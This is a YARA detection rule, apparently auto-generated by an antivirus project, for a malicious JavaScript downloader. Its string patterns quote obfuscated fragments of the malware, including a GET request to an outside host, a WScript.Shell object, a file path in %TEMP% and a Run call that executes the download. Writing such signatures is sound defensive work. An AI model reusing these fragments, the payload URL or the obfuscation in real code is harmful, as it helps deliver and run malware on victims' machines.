rule sig_20160427_09e7af599ea75c6e92b3493d912213f8 {
  meta:
    description = "datamaliciousorder - file 20160427_09e7af599ea75c6e92b3493d912213f8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "531bfe706c156c9cd175a9a9debda5457d025d9864fb9d01cbd98fb0e8d80000"

  strings:
    $s1  = "QwpiyUqrwh[MvtjfPwlnk](\"G\" + \"ET\", \"http://onlinecrockpotrecipes.com/k2tspa\", false);" fullword ascii
    $s2  = "function MtfbiAfmik() {return DrvwcUvajn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8apiSp9" ascii
    $s3  = "function MtfbiAfmik() {return DrvwcUvajn[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8apiSp9" ascii
    $s4  = "var DrvwcUvajn = function DtpabBgytj() {return MgcgjGyvrn[XeaqmDswkt](\"WScript\"+\".Shell\");}(), InmtuRwoos = 11;" fullword ascii
    $s5  = "var MgcgjGyvrn = this[\"WScript\"];" fullword ascii
    $s6  = "function JznvsUjrng(){return KigcyRxiwf + \"\";};" fullword ascii
    $s7  = "function CavwoIsftj(GezhyBxbdd, UeicfWdhja){ChvesTqchu = ChvesTqchu * 1; return GezhyBxbdd - UeicfWdhja;};" fullword ascii
    $s8  = "if (QwpiyUqrwh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function PefjwXwevm() {return ((HkdclMmnrs == true) && (HkdclMmnrs == KmptkZxouq)) ? 1 : ChvesTqchu;};" fullword ascii
    $s10 = "var KmptkZxouq = false;" fullword ascii
    $s11 = "}while (BlyikHtnxu);" fullword ascii
    $s12 = "var CioklFwxbd = false;" fullword ascii
    $s13 = "KmptkZxouq = true; " fullword ascii
    $s14 = "CioklFwxbd = true;" fullword ascii
    $s15 = "var HkdclMmnrs = false;" fullword ascii
    $s16 = "function OpnuwNbayj()" fullword ascii
    $s17 = "function SrbsyNxjpt(KekmpJsbfz){DrvwcUvajn[\"R\"+\"un\"](KekmpJsbfz, ChvesTqchu, ChvesTqchu);};" fullword ascii
    $s18 = "function KtkvbUhysn(DdzwwIyjtq) {var BmwuyJbdti = (1, 2, 3, 4, 5, DdzwwIyjtq); return BmwuyJbdti;};" fullword ascii
    $s19 = "HkdclMmnrs = true; " fullword ascii
    $s20 = "var AfrxuPtrpi = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}